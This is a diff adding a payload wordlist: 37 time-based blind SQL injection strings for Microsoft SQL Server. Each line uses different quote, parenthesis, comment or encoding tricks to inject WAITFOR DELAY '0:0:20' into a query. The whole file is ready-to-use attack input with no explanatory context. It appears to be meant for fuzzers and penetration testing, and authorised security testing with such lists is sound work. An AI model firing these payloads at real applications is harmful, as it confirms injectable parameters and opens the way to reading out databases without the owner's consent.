@@ -1,0 +1,37 @@
+;waitfor delay '0:0:20'--
+';WAITFOR DELAY '0:0:20'--
+);waitfor delay '0:0:20'--
+';waitfor delay '0:0:20'--
+";waitfor delay '0:0:20'--
+');waitfor delay '0:0:20'--
+");waitfor delay '0:0:20'--
+));waitfor delay '0:0:20'--
+'));waitfor delay '0:0:20'--
+"));waitfor delay '0:0:20'--
+") IF (1=1) WAITFOR DELAY '0:0:20'--
+';%5waitfor%5delay%5'0:0:20'%5--%5
+' WAITFOR DELAY '0:0:20'--
+' WAITFOR DELAY '0:0:20'
+or WAITFOR DELAY '0:0:20'--
+or WAITFOR DELAY '0:0:20'
+and WAITFOR DELAY '0:0:20'--
+and WAITFOR DELAY '0:0:20'
+WAITFOR DELAY '0:0:20'
+;WAITFOR DELAY '0:0:20'--
+;WAITFOR DELAY '0:0:20'
+1 WAITFOR DELAY '0:0:20'--
+1 WAITFOR DELAY '0:0:20'
+1 WAITFOR DELAY '0:0:20'-- 1337
+1' WAITFOR DELAY '0:0:20' AND '1337'='1337
+1') WAITFOR DELAY '0:0:20' AND ('1337'='1337
+1) WAITFOR DELAY '0:0:20' AND (1337=1337
+') WAITFOR DELAY '0:0:20'--
+" WAITFOR DELAY '0:0:20'--
+')) WAITFOR DELAY '0:0:20'--
+'))) WAITFOR DELAY '0:0:20'--
+%' WAITFOR DELAY '0:0:20'--
+") WAITFOR DELAY '0:0:20'--
+")) WAITFOR DELAY '0:0:20'--
+"))) WAITFOR DELAY '0:0:20'--
+1 waitfor delay '0:0:20'--
+1' waitfor delay '0:0:20'--
